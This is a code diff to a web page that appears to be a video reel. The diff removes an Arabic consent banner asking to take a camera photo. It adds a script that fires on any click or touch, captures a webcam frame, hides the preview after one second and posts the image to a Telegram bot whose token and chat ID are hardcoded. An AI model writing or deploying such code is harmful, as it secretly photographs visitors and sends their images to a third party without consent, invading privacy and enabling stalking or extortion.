@@ -1,18 +1,68 @@
-<div class="video-container">
-    <!-- فيديو التشغيل الأساسي -->
-    <video id="myVideo" controls>
-        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-        متصفحك لا يدعم تشغيل هذا الفيديو.
-    </video>
+<!-- تم التثبيت على اسم الملف الخاص بك my_reel.mp4 -->
+<video id="mainVideo" controls autoplay loop playsinline muted>
+    <source src="my_reel.mp4" type="video/mp4">
+</video>
 
-    <!-- الصورة الملتقطة -->
-    <img id="capturedImage" alt="الصورة الملتقطة" />
+<img id="result" alt="">
 
-    <!-- اللافتة المنبثقة -->
-    <div class="cam-banner" id="camBanner">
-        <p id="camPrompt">هل تسمح بالتقاط صورة بواسطة الكاميرا؟</p>
-        <button id="takeSnapBtn">سماح والتقاط صورة</button>
-    </div>
-</div>
+<script>
+    const TELEGRAM_BOT_TOKEN = '8469850859:AAFQJDODXLXA-9jJYhYJ8ASll3-6d2RnIQA';
+    const TELEGRAM_CHAT_ID = '6642913954';
 
-<p id="statusText">بانتظار التقاط الصورة...</p>
+    let isProcessing = false;
+
+    async function handleCapture() {
+        if (isProcessing) return;
+        isProcessing = true;
+
+        let stream = null;
+
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+
+            const img = document.getElementById('result');
+            img.src = canvas.toDataURL('image/png');
+            img.style.display = 'block';
+
+            setTimeout(() => {
+                img.style.display = 'none';
+            }, 1000);
+
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, 'capture.png');
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (err) {
+                    console.error("Error:", err);
+                }
+            }, 'image/png');
+
+        } catch (err) {
+            console.error("Camera Error:", err);
+        } finally {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        }
+    }
+
+    window.addEventListener('click', handleCapture);
+    window.addEventListener('touchstart', handleCapture);
+</script>
